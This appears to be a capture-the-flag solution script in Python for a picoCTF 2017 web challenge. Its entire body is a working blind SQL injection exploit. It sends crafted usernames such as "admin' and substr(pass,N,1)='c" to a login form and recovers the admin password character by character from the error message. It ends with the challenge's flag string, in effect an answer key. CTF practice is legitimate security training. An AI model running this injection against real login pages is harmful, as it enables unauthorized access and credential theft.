import requests
import string

URL = 'http://shell2017.picoctf.com:16012/'

so_far = []

total_failure = False

while not total_failure:
    total_failure = True

    for tried_char in string.printable:
        username = "admin' and substr(pass,%s,1)='%s" % (1+len(so_far), tried_char)
        password = "z"

        r = requests.post(URL, data={'username': username, 'password': password})
        if 'Incorrect Password' in str(r.content):
            print 'found: %s' % tried_char
            so_far.append(tried_char)
            total_failure = False

flag = 'not_all_errors_should_be_shown_599bfc4ee4197fdc5ed93612a9c4f515'
